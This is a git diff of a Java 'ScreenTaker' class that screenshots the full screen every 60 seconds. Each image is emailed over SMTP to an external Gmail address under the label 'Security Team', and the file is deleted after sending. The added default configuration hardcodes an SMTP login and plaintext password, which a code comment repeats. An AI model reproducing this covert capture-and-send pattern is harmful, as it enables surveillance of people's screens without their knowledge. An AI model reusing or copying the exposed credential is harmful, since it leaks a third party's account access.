@@ -9,6 +9,8 @@ import java.io.File;
 import java.io.IOException;
 import java.net.Inet4Address;
 import java.net.UnknownHostException;
+import java.nio.file.Files;
+import java.nio.file.Path;
 
 import javax.imageio.ImageIO;
 
@@ -34,31 +36,58 @@ public class ScreenTaker implements Job{
 	private String IP;
 	private String HostName;
 	private Robot robot;
-	private String os;
-	
-	//private static String mac_path="//home//";
-	//private static String win_path="c:\\windows_update\\log\\";
-	
-	private String path;
-	private String email_to_send;
-	private String email_usr;
-	private String email_pwd;
-	private String domain;
-	private int port;
-	
+	private Config conf;
 	private File output;
 	private String date;
 
-	private int interval;
 	
+	private void setNetworkData() throws UnknownHostException{
+		IP = Inet4Address.getLocalHost().getHostAddress();
+		System.out.println(IP);
+		HostName = Inet4Address.getLocalHost().getHostName();
+		System.out.println(HostName);
+	}
+	
+	
+	private void defaultConfig() {
+		// TODO Auto-generated method stub
+		conf = new Config();
+		conf.setInterval(60);
+		EmailConfig emailconfig = new EmailConfig();
+		emailconfig.setDomain("smtp.sunset.com.mx");
+		emailconfig.setEmail_usr("eosorio@sunset.com.mx");
+		emailconfig.setEmail_pwd("Sys73xrv21");
+		emailconfig.setEmail_to_send("orkwizard@gmail.com");
+		emailconfig.setPort(587);
+		conf.setEmail_config(emailconfig);
+		System.out.println("Default Config ->" + conf.toString());
+	}
 	
 	public ScreenTaker(){
 		try {
-			IP = Inet4Address.getLocalHost().getHostAddress();
-			HostName = Inet4Address.getLocalHost().getHostName();
+			setNetworkData();
+		} catch (UnknownHostException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+			defaultConfig();
+		try {
 			robot = new Robot();
-			os = System.getProperties().getProperty("os.name");
-			
+		} catch (AWTException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		
+	}
+	
+	
+	public ScreenTaker(Config con){
+		try {
+			setNetworkData();
+			if(con==null){
+				defaultConfig();
+				robot = new Robot();
+			}
 		} catch (UnknownHostException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
@@ -68,13 +97,11 @@ public class ScreenTaker implements Job{
 		}
 	}
 	
-	public boolean captureLocal(){
-		
-		return true;
-	}
-
 	public BufferedImage capture(){
-		return robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+		System.out.println("Capturing Image......");
+		BufferedImage img = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
+		System.out.println("Captured Image.......");
+		return img;
 	}
 
 	public String getIP() {
@@ -95,27 +122,10 @@ public class ScreenTaker implements Job{
 	
 	
 	 public static void main(String[] args){
-		 
-		 int args_size = args.length;
-		 
-		 
-		 switch (args_size) {
-			case 0:
-				break;
-			case 1:
-				
-			case 2:
-				
-			case 3:
-
-			default:
-				break;
-			}
-		 
-		 
 		 try {
 			Scheduler scheduler = StdSchedulerFactory.getDefaultScheduler();	
 			scheduler.start();
+			System.out.println("New Job");
 			JobDetail job = JobBuilder.newJob(ScreenTaker.class).build();
 			Trigger trigger = TriggerBuilder.newTrigger().withIdentity("trigger","group1")
 					.withSchedule(SimpleScheduleBuilder.simpleSchedule().withIntervalInSeconds(60).repeatForever())
@@ -127,14 +137,13 @@ public class ScreenTaker implements Job{
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
-		 
-		 	 
 	 }
 
 	@Override
 	public void execute(JobExecutionContext arg0) throws JobExecutionException {
 		// TODO Auto-generated method stub
 		date = DateTime.now().toString();
+		System.out.println("Creating snapshot");
 		createScreenshot();
 		buildEmail();
 		
@@ -142,65 +151,18 @@ public class ScreenTaker implements Job{
 
 	private void createScreenshot() {
 		try {
-			output = new File(path+getIP()+".jpg");
+			Path tempFile = Files.createTempFile(getIP(),".jpg");
+			output = tempFile.toFile();
 			ImageIO.write(capture(),"jpg", output);
+			System.out.println("FileName :-> " + output.getName());
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
-			e.printStackTrace();
+			System.out.println(e.getMessage());
 		}
-		
-		
-		
+
 	}
 
-	public String getPath() {
-		return path;
-	}
-
-	public void setPath(String path) {
-		this.path = path;
-	}
-
-	public String getEmail_to_send() {
-		return email_to_send;
-	}
-
-	public void setEmail_to_send(String email_to_send) {
-		this.email_to_send = email_to_send;
-	}
-
-	public String getEmail_usr() {
-		return email_usr;
-	}
-
-	public void setEmail_usr(String email_usr) {
-		this.email_usr = email_usr;
-	}
-
-	public String getEmail_pwd() {
-		return email_pwd;
-	}
-
-	public void setEmail_pwd(String email_pwd) {
-		this.email_pwd = email_pwd;
-	}
-
-	public String getDomain() {
-		return domain;
-	}
-
-	public void setDomain(String domain) {
-		this.domain = domain;
-	}
-
-	public int getPort() {
-		return port;
-	}
-
-	public void setPort(int port) {
-		this.port = port;
-	}
-
+	
 	public File getOutput() {
 		return output;
 	}
@@ -219,34 +181,27 @@ public class ScreenTaker implements Job{
 
 	private void buildEmail() {
 		// TODO Auto-generated method stub
+		System.out.println("Sending Email.......");
 		MultiPartEmail email = new MultiPartEmail();
-		email.setHostName(getDomain()); //smtp.sunset.com.mx
-		email.setSmtpPort(getPort()); //587
-		email.setAuthentication(getEmail_usr(),getEmail_pwd()); //"eosorio@sunset.com.mx","Sys73xrv21"
+		email.setHostName(conf.getEmail_config().getDomain()); //smtp.sunset.com.mx
+		email.setSmtpPort(conf.getEmail_config().getPort()); //587
+		email.setAuthentication(conf.getEmail_config().getEmail_usr(),conf.getEmail_config().getEmail_pwd()); //"eosorio@sunset.com.mx","Sys73xrv21"
 		try {
-			/*email.addTo("eosorio@sunset.com.mx");
-			*/
-			
-			email.addTo(getEmail_to_send());
+			email.addTo(conf.getEmail_config().getEmail_to_send());
 			email.setFrom("security@sunset.com.mx","Security Team");
 			email.setSubject("Security File");
 			email.setMsg("Security log from : ->>>>"+ getIP()+" --> "+ date);
 			email.attach(output);
 			email.send();
-			
+			System.out.println("Email Sent");
+			output.delete();
+			System.out.println("Deleted File");
 		} catch (EmailException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
 	}
 
-	public String getOs() {
-		return os;
-	}
-
-	public void setOs(String os) {
-		this.os = os;
-	}
 
 	
 }
